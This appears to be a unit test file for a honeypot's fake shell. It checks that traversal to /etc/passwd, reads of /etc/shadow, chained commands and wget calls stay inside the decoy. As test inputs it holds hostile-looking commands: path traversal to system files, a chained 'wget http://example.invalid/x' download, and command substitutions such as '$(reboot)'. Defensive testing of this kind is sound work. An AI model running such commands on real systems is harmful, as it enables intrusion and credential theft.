import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from honeypot.shell import FakeShell  # noqa: E402


class ShellTests(unittest.TestCase):
    def test_filesystem_stays_inside_the_decoy(self):
        shell = FakeShell("admin", "prod-gateway")
        shell.handle("cd /tmp")
        output = shell.handle("cat ../../../../etc/passwd")
        self.assertIn("root:x:0:0:root:/root:/bin/bash", output)
        self.assertNotIn("Administrator", output)

    def test_shadow_is_not_readable(self):
        shell = FakeShell("admin", "prod-gateway")
        output = shell.handle("cat /etc/shadow")
        self.assertIn("Permission denied", output)
        self.assertNotIn(":$", output)

    def test_windows_path_is_not_a_host_file(self):
        shell = FakeShell("admin", "prod-gateway")
        output = shell.handle(r"cat C:\Windows\win.ini")
        self.assertNotIn("for 16-bit app support", output.lower())
        self.assertIn("No such file", output)

    def test_operators_are_not_executed(self):
        shell = FakeShell("admin", "prod-gateway")
        output = shell.handle("cat /etc/passwd; wget http://example.invalid/x")
        self.assertIn("unsupported operator", output)
        self.assertNotIn("root:x:0:0", output)

    def test_wget_does_not_touch_the_network(self):
        import time

        shell = FakeShell("admin", "prod-gateway")
        started = time.monotonic()
        output = shell.handle("wget http://example.invalid/lab-decoy.sh")
        self.assertLess(time.monotonic() - started, 0.5)
        self.assertIn("unable to resolve", output)

    def test_exit_and_identity(self):
        shell = FakeShell("root", "prod-gateway")
        self.assertEqual(shell.handle("whoami"), "root")
        self.assertEqual(shell.handle("pwd"), "/root")
        self.assertEqual(shell.handle("exit"), "")
        self.assertTrue(shell.closed)

    def test_odd_input_does_not_raise(self):
        samples = ["", "   ", "a" * 600, "cd /root", "ls -la /", "$(reboot)", "`id`", "exit"]
        for sample in samples:
            shell = FakeShell("admin", "box")
            shell.handle(sample)


if __name__ == "__main__":
    unittest.main()
